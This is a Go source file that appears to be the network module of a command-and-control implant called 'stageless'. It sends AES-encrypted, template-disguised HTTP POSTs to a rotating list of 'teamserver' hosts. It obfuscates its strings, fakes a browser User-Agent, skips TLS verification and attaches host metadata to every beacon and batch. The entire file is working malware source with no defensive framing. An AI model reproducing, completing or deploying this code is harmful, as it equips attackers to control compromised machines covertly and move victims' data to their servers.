package network

import (
	"crypto/tls"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"time"

	"stageless/utils/crypt"
	general "stageless/utils/general"
	global "stageless/utils"
	"stageless/utils/obf"
	"stageless/utils/tasks"
)

type HTTPResponse struct {
	OK   bool
	Code uint16
	Body string
}

const ContentMarker = "§content§"

// Check size cap > OOM ====================================================
func httpResponseBodyWithinLimit(contentLength int64, bodyLen int) bool {
	// Checks that the response body stays within the size cap
	maxHttpRespBody := int(tasks.TasksBufferMax)
	if contentLength >= 0 && contentLength > int64(maxHttpRespBody) {
		return false
	}
	return bodyLen <= maxHttpRespBody
}
// =========================================================================

func bodyTemplate() string {
	// Returns the body template used to wrap the payload
	if global.CustomCommunication != ContentMarker {
		return global.CustomCommunication
	}
	for key, value := range global.BodyContent {
		if key == obf.S("template") {
			return value
		}
	}
	return ContentMarker
}

func ExtractFromTemplate(raw, tpl string) string {
	// Extracts the marked content from the raw template string
	tpl = strings.TrimSpace(tpl)
	if tpl == "" || tpl == ContentMarker {
		return raw
	}
	parts := strings.Split(tpl, ContentMarker)
	if len(parts) < 2 {
		return ""
	}
	pos := 0
	for i := 0; i < len(parts)-1; i++ {
		prefix := parts[i]
		suffix := parts[i+1]
		if prefix != "" {
			p := strings.Index(raw[pos:], prefix)
			if p < 0 {
				return ""
			}
			pos += p + len(prefix)
		}
		endPos := len(raw)
		if suffix != "" {
			s := strings.Index(raw[pos:], suffix)
			if s < 0 {
				return ""
			}
			endPos = pos + s
		}
		if i == len(parts)-2 {
			out := raw[pos:endPos]
			return out
		}
		pos = endPos + len(suffix)
	}
	return ""
}

func ExtractResponsePayload(raw string) string {
	// Extracts the response payload from the raw body
	if global.CustomCommunication == ContentMarker {
		return raw
	}
	return ExtractFromTemplate(raw, global.ServerResponseTemplate)
}

func buildWirePayload(plain string) string {
	// Builds the encrypted wire payload from the plain text
	encrypted := crypt.CryptEncryptWithProbe(global.AesKey, plain)
	if len(encrypted) <= crypt.AesProbeWireLen {
		return ""
	}
	tpl := bodyTemplate()
	if tpl == ContentMarker {
		return encrypted
	}
	wire := strings.ReplaceAll(tpl, ContentMarker, encrypted)
	return wire
}

func baseURL() string {
	// Builds the base URL from the first entry of the teamserver lists
	sep := obf.S(",")
	pt := strings.Split(global.Port, sep)[0]
	p := general.ParsePortDigits(pt)
	if p == 0 {
		return ""
	}
	scheme := obf.S("http://")
	if global.Channel == obf.S("https") {
		scheme = obf.S("https://")
	}
	return scheme + strings.Split(global.Host, sep)[0] + obf.S(":") + pt + strings.Split(global.Path, sep)[0]
}

func exchangeURL(url, payload string) HTTPResponse {
	// Here is where the HTTP request is sent and the response is read
	if url == "" {
		return HTTPResponse{}
	}
	client := &http.Client{Timeout: 60 * time.Second}
	if strings.HasPrefix(url, obf.S("https://")) {
		client.Transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}
	var bodyReader io.Reader
	if payload != "" {
		wire := buildWirePayload(payload)
		if wire == "" {
			return HTTPResponse{}
		}
		bodyReader = strings.NewReader(wire)
	}
	req, err := http.NewRequest(http.MethodPost, url, bodyReader)
	if err != nil {
		return HTTPResponse{}
	}
	req.Header.Set(obf.S("Connection"), obf.S("close"))
	req.Header.Set(obf.S("User-Agent"), obf.S("Mozilla/5.0"))
	hasMeta := false
	for key, value := range global.CustomHeaders {
		hasMeta = true
		req.Header.Set(key, value)
	}
	if len(global.CustomCookies) > 0 {
		hasMeta = true
		var cookies []string
		for key, value := range global.CustomCookies {
			cookies = append(cookies, key+obf.S("=")+value)
		}
		req.Header.Set(obf.S("Cookie"), strings.Join(cookies, obf.S("; ")))
	}
	if payload != "" && !hasMeta {
		req.Header.Set(obf.S("Content-Type"), obf.S("application/octet-stream"))
	}
	resp, err := client.Do(req)
	if err != nil {
		return HTTPResponse{}
	}
	defer resp.Body.Close()
	// Check size cap > OOM ===============================================
	if !httpResponseBodyWithinLimit(resp.ContentLength, 0) {
		return HTTPResponse{}
	}
	var rawBody []byte
	if resp.ContentLength > 0 {
		rawBody = make([]byte, resp.ContentLength)
		if _, err := io.ReadFull(resp.Body, rawBody); err != nil {
			return HTTPResponse{}
		}
	} else {
		limited := io.LimitReader(resp.Body, int64(tasks.TasksBufferMax)+1)
		rawBody, err = io.ReadAll(limited)
		if err != nil {
			return HTTPResponse{}
		}
	}
	if !httpResponseBodyWithinLimit(resp.ContentLength, len(rawBody)) {
		return HTTPResponse{}
	}
	// ====================================================================
	responsePayload := rawBody
	if global.CustomCommunication != ContentMarker {
		responsePayload = []byte(ExtractResponsePayload(string(rawBody)))
	}
	plain := crypt.TryCryptDecryptBytes(global.AesKey, responsePayload)
	rawBody = nil
	responsePayload = nil
	body := string(plain)
	plain = nil
	return HTTPResponse{
		OK:   true,
		Code: uint16(resp.StatusCode),
		Body: body,
	}
}

func HTTPPost(body string) HTTPResponse {
	// Sends a post request to the base URL, rotating team servers when one is unreachable
	resp := exchangeURL(baseURL(), body)
	if resp.OK {
		return resp
	}
	sep := obf.S(",")
	hs := strings.Split(global.Host, sep)
	ps := strings.Split(global.Port, sep)
	xs := strings.Split(global.Path, sep)
	if len(hs) > 1 && len(ps) == len(hs) && len(xs) == len(hs) {
		global.Host = strings.Join(append(hs[1:], hs[0]), sep)
		global.Port = strings.Join(append(ps[1:], ps[0]), sep)
		global.Path = strings.Join(append(xs[1:], xs[0]), sep)
	}
	return resp
}

func SendRequest(tag string) HTTPResponse {
	// Builds the request payload and sends it
	payload, err := json.Marshal(map[string]any{
		obf.S("option"):   obf.S("input"),
		obf.S("host"):    tag,
		obf.S("metadata"): general.CreateMetadata(),
	})
	if err != nil {
		return HTTPResponse{}
	}
	return HTTPPost(string(payload))
}

func SendBatch(payload string) HTTPResponse {
	// Sends a batch of items with metadata attached
	if len(payload) <= 2 || payload == obf.S("[]") {
		return HTTPResponse{}
	}
	var batch []map[string]any
	if err := json.Unmarshal([]byte(payload), &batch); err == nil {
		meta := general.CreateMetadata()
		for i := range batch {
			batch[i][obf.S("metadata")] = meta
		}
		wire, err := json.Marshal(batch)
		if err != nil {
			return HTTPResponse{}
		}
		return HTTPPost(string(wire))
	}
	return HTTPPost(payload)
}

func RelayCall(payload string) HTTPResponse {
	// Forwards the payload through an HTTP post
	return HTTPPost(payload)
}
